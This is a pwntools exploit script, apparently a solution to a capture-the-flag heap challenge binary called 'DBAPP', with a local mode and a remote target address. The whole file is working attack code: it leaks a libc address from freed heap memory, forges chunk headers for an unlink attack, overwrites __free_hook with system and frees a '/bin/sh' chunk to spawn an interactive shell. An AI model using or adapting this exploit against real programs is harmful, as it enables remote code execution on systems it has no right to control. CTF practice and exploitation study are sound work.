# coding:utf-8
from pwn import *
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
LOCAL = 1
if LOCAL:
    io = process('./DBAPP')#,env={"LD_PRELOAD":"./libc-2.24.so"})
    context.log_level = 'debug'
else:
    io = remote("39.107.33.43", 13570)

def z(a=''):
	gdb.attach(io,a)
	if a == '':
		raw_input()

def mmenu(choice):
    io.recvuntil("Your choice:")
    io.sendline(choice)

def Add(length,name):
    mmenu('2')
    io.recvuntil('Please enter the length of item name:')
    io.sendline(str(length))
    io.recvuntil('Please enter the name of item:')
    io.send(name)

def Show():
    mmenu('1')

def Delete(index):
    mmenu('4')
    io.recvuntil('Please enter the index of item:')
    io.sendline(str(index))

def Change(index,length,name):
    mmenu('3')
    io.recvuntil('Please enter the index of item:')
    io.sendline(str(index))
    io.recvuntil('Please enter the length of item name:')
    io.sendline(str(length))
    io.recvuntil('Please enter the new name of the item:')
    io.sendline(name)

Apps_addr = 0x00000000006020A8
system_libc = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
malloc_hook_libc = libc.symbols['__malloc_hook']

def pwnit():
	#leak libc_base and calc some useful addr
	Add(0x80,'/bin/sh\x00') #0
	Add(0x100,'AAAA') #1
	Add(0x10,'AAAA') #2
	Delete(1)
	Add(0xD0,'AAAAAAAA') #3
	Show()
	io.recvuntil('3 : AAAAAAAA')
	data = u64(io.recv(6).ljust(8,'\x00'))
	success('data:'+hex(data))
	libc_base = data - malloc_hook_libc - 0x168 #00007F6BD95B8C78  libc_2.23.so:__malloc_hook+168
	free_hook_addr = free_hook + libc_base
	system_addr = system_libc + libc_base
	success('free_hook_addr:'+hex(free_hook_addr))
	success('system_addr:'+hex(system_addr))

	Add(0x20,'AAAA') #4

	Add(0x100,'BBBB') #5
	Add(0x100,'BBBB') #6
	Delete(5)
	Delete(6)
#	z()
	payload = p64(0) + p64(0x101)
	payload += p64(0x6020F8 - 0x18) + p64(0x6020F8 - 0x10)
	payload += 'a'*(0x100 - 4*8)
	payload += p64(0x100) + p64(0x110) + p64(0)*2

	Add(0x100+0x100+0x10,payload) #7
#	z()
	Delete(6)
#	z()


	Change(5,17,p64(0)+p64(free_hook_addr))

	Change(4,17,p64(system_addr)*2)

	Delete(0)

	io.interactive()

    
if __name__ == "__main__":
    pwnit()